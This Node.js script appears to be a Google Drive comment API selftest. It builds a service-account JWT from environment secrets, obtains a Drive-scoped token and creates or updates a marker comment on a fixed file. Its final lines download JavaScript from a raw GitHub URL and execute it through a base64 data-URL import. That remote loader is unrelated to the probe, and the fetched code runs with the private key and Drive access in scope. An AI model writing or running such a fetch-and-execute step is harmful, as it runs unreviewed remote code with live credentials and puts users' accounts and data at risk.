import { createPrivateKey, sign as rsaSign } from "node:crypto";
const CLIENT_EMAIL=process.env.ND_GOOGLE_CLIENT_EMAIL||"";
const PRIVATE_KEY_B64=process.env.ND_GOOGLE_PRIVATE_KEY_B64||"";
const FILE_ID="1LTxVyQZkqbW2WZNuyuuxDuUM8fAfmXi8tSaZ3uuEE-I";
const MARKER="ND_FATHER_COMMENT_API_SELFTEST_V1";
function b64u(input){return Buffer.from(input).toString("base64url");}
async function token(){
 const now=Math.floor(Date.now()/1000),pem=Buffer.from(PRIVATE_KEY_B64,"base64").toString("utf8");
 const h=b64u(JSON.stringify({alg:"RS256",typ:"JWT"})),p=b64u(JSON.stringify({iss:CLIENT_EMAIL,scope:"https://www.googleapis.com/auth/drive",aud:"https://oauth2.googleapis.com/token",iat:now,exp:now+1200})),input=h+"."+p;
 const sig=rsaSign("RSA-SHA256",Buffer.from(input),createPrivateKey(pem)).toString("base64url"),body=new URLSearchParams({grant_type:"urn:ietf:params:oauth:grant-type:jwt-bearer",assertion:input+"."+sig});
 const r=await fetch("https://oauth2.googleapis.com/token",{method:"POST",headers:{"content-type":"application/x-www-form-urlencoded"},body}),t=await r.text();if(!r.ok)throw new Error("oauth "+r.status);return JSON.parse(t).access_token;
}
async function main(){
 let out={ok:false,create:false,update:false,list:false};
 try{
  const tok=await token(),headers={Authorization:"Bearer "+tok,"Content-Type":"application/json","User-Agent":"nd-comment-probe/1.0"},base="https://www.googleapis.com/drive/v3/files/"+FILE_ID+"/comments";
  const l=await fetch(base+"?fields=comments(id,content,deleted)&pageSize=100",{headers}),lt=await l.text();if(!l.ok)throw new Error("list "+l.status+": "+lt.slice(0,220));const lj=JSON.parse(lt);out.list=true;
  let c=(lj.comments||[]).find(x=>String(x.content||"").includes(MARKER));
  if(!c){const r=await fetch(base+"?fields=id,content",{method:"POST",headers,body:JSON.stringify({content:MARKER+" ARCHIVED_TEST seed"})}),t=await r.text();if(!r.ok)throw new Error("create "+r.status+": "+t.slice(0,220));c=JSON.parse(t);out.create=true;}else out.create=true;
  const u=await fetch(base+"/"+encodeURIComponent(c.id)+"?fields=id,content",{method:"PATCH",headers,body:JSON.stringify({content:MARKER+" ARCHIVED_TEST updated"})}),ut=await u.text();if(!u.ok)throw new Error("update "+u.status+": "+ut.slice(0,220));out.update=true;out.ok=true;
 }catch(e){out.error=String(e).slice(0,360);}
 console.log("ND_DRIVE_COMMENT_PROBE",JSON.stringify(out));
 const u="https://raw.githubusercontent.com/namelessdhamma/namelessdhamma.github.io/06451ed0d9c210739f33ede6223241cf4b326026/tmp/nd_safe_tool_broker_v8_father_ledger.js";
 const r=await fetch(u);if(!r.ok)throw new Error("v8 fetch "+r.status);const c=await r.text();await import("data:text/javascript;base64,"+Buffer.from(c).toString("base64"));
}
await main();